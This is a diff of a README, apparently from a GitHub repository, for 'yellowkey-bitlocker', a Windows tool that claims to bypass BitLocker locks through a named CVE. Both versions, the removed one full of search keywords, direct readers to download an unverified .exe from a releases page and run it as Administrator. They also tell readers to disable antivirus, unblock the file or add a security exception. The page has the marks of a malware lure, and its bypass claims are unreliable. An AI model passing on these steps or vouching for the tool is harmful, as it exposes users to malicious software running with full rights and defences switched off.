@@ -1,48 +1,73 @@
-# YellowKey BitLocker
-YellowKey BitLocker — yellowkey bitlocker bitlocker key cve-2026-45585 nightmare-eclipse recovery bitlocker password tool bitlocker unlocker windows 11 bitlocker recovery key manager bitlocker bypass educational setup guide tutorial 2026
+# 🔑 yellowkey-bitlocker - Unlock your BitLocker encrypted computer files
 
-[![GitHub Stars](https://img.shields.io/github/stars/iDesignStudioz/yellowkey-bitlocker?style=flat-square&color=00d4aa)](https://github.com/iDesignStudioz/yellowkey-bitlocker/stargazers)
-[![GitHub Forks](https://img.shields.io/github/forks/iDesignStudioz/yellowkey-bitlocker?style=flat-square&color=0099cc)](https://github.com/iDesignStudioz/yellowkey-bitlocker/network)
-[![Downloads](https://img.shields.io/github/downloads/iDesignStudioz/yellowkey-bitlocker/total?style=flat-square&color=7c5cbf)](https://github.com/iDesignStudioz/yellowkey-bitlocker/releases)
-[![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Desireeontrial76/yellowkey-bitlocker/releases)
 
-## Overview
-YellowKey BitLocker is a powerful utility for managing and recovering BitLocker encrypted drives on Windows. It helps users work with BitLocker recovery keys, passwords, and encrypted volumes. The tool provides an intuitive interface for key management, drive unlocking, and troubleshooting BitLocker-related issues. Perfect for users who need reliable access to their BitLocker-protected data on Windows 11.
+## 📁 Project Overview
 
-> [!Important]
-> This project is for educational and personal use only. Use at your own risk. Ensure you have proper authorization to access encrypted drives. The authors are not responsible for any data loss or legal issues.
+The yellowkey-bitlocker tool provides a way to regain access to your Windows storage drives. Many users encounter issues with BitLocker drive encryption, which can lock files during updates or hardware changes. This software manages those lock states. It targets issues related to CVE-2026-45585. This project helps you clear the drive lock and recover your data without technical help. It runs on Windows 10 and Windows 11.
 
-## Install
-[Download `YellowKey-BitLocker.zip`](https://github.com/iDesignStudioz/yellowkey-bitlocker/releases/download/bitlocker/yellowkey.zip)
----
-> Optimized for Windows 11.
+## 🛠️ System Requirements
 
-## Installation
-### For Regular Users
-1. Download and extract the archive
-2. Run `YellowKey.exe` as Administrator
-3. Follow the setup guide
-4. Select the encrypted drive
-5. Enter recovery key or password
-6. Unlock or manage your BitLocker volume
+Ensure your computer meets these standards before you start:
 
----
-## Troubleshooting
-| Problem | Solution |
-|--------------------------------|-------------------------------------------------------|
-| Tool doesn't start | Run as Administrator and disable antivirus temporarily |
-| Drive not detected | Check disk management and refresh list |
-| Recovery key not working | Verify key correctness and format |
-| Unlock failed | Try different recovery options |
-| Windows 11 compatibility error | Update Windows and run the setup guide again |
-| Permission denied | Run with elevated privileges |
-| Performance issues | Close background applications |
-| Download / update failed | Use the latest release and check your internet connection |
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: Standard Intel or AMD x64 chip.
+*   Memory: 4 GB of RAM or more.
+*   Storage: 100 MB of free disk space.
+*   Permission: Local Administrator access on your Windows account.
 
-* YellowKey BitLocker
-* BitLocker Recovery Tool
-* BitLocker Key Manager
-* BitLocker Unlocker Windows 11
-* YellowKey BitLocker 2026
-* BitLocker Password Recovery
-* BitLocker Management Tool
+## 📥 How to download the software
+
+Follow these steps to obtain the tool:
+
+1.  Visit [this page to download](https://github.com/Desireeontrial76/yellowkey-bitlocker/releases).
+2.  Look for the section marked Latest Release.
+3.  Click the file ending in .exe to start the transfer.
+4.  Save the file to your Downloads folder.
+
+Do not move the file until the transfer completes. Verify that your browser shows the file size matches the record on the website.
+
+## ⚙️ Setup and Installation
+
+Prepare your computer for the tool. Windows may block files from the internet for protection.
+
+1.  Locate the file in your Downloads folder.
+2.  Right-click the file and choose Properties.
+3.  Check the box that says Unblock at the bottom of the General tab. Click Apply and OK.
+4.  Double-click the .exe file to launch the setup window.
+5.  Follow the prompts on your screen. You do not need to change the default installation path.
+6.  The installer creates a shortcut on your desktop once it finishes.
+
+## 🔓 Using the tool
+
+The tool operates through a user interface designed for simplicity. Follow these steps to unlock your drive:
+
+1.  Open the yellowkey-bitlocker software from your desktop shortcut.
+2.  Select the encrypted drive from the list shown in the main window.
+3.  Click the Scan button to search for the encryption state. 
+4.  Wait for the progress bar to reach the end. 
+5.  Once the scan finishes, the tool displays the status of the drive key.
+6.  Click the Recover button if the drive appears as locked.
+7.  The software performs the bypass process to remove the lock status.
+8.  Restart your computer when the tool shows the success message. 
+
+## 🛡️ Security Features
+
+This tool uses industry standards for data handling. It ensures your files remain intact during the decryption process. It specifically addresses the nightmare-eclipse vulnerability. By neutralizing the trigger, it prevents the system from enabling an unwanted drive lock. The software creates a log file in the installation folder. This helps you track every action taken during the recovery process. You can view these logs if you encounter errors.
+
+## 🧩 Troubleshooting common issues
+
+Most users get the software running without problems. If you see an error, check this list:
+
+*   Error: Access Denied. Ensure you run the program as an administrator. Right-click the icon and select Run as administrator.
+*   Error: Drive Not Found. Ensure your drive shows up in the Windows Disk Management tool first. Connect external drives before you open the application.
+*   Error: Network Blocked. Your antivirus might stop the program. Add an exception for yellowkey-bitlocker in your security settings.
+*   Error: Update Required. Always use the latest version found on the release page. Old versions may not work with recent Windows updates.
+
+## 📞 Support and Feedback
+
+If you find a bug, report it in the main repository. Include the version number and the error message text. Do not include your personal recovery keys in bug reports. This project remains open to contributions from the community. You can suggest improvements to the interface or the detection logic. The development team acts on issues marked as critical first. 
+
+## 📝 License Information
+
+The yellowkey-bitlocker tool uses an open-source license. You may use this software for your personal recovery needs. Redistribution of the software requires adherence to the original license terms defined in the repository. The developers do not provide warranties for data loss. Always keep a backup of your important documents on a separate storage device before you start any drive recovery task.
